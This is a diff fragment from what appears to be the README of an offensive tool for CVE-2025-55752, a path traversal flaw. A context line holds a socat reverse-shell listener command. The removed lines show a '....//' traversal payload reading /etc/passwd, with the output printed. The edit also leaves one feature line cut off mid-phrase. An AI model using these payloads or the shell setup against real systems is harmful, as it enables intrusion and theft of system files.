@@ -170,19 +170,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 - Intelligent file path construction for maximum traversal depth
 - Adaptive payload selection based on initial scan results
 - Multi-platform shellcode generation (Unix/Windows/Python)
-- Safe file handling and evidence preservation
-
-**Example Output Breakdown**
-
-```
-[+] Scanning for CVE-2025-55752...
-  Testing: Double dot slash encoding
-    [+] VULNERABLE! CVE-2025-55752 - Found /etc/passwd
-    [+] Payload: ....//....//....//....//....//etc/passwd
-    [+] File preview:
-      root:x:0:0:root:/root:/bin/bash
-      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-```
+- Safe file handling and evidence 
 
 This shows successful vulnerability confirmation with:
 - Specific CVE identification
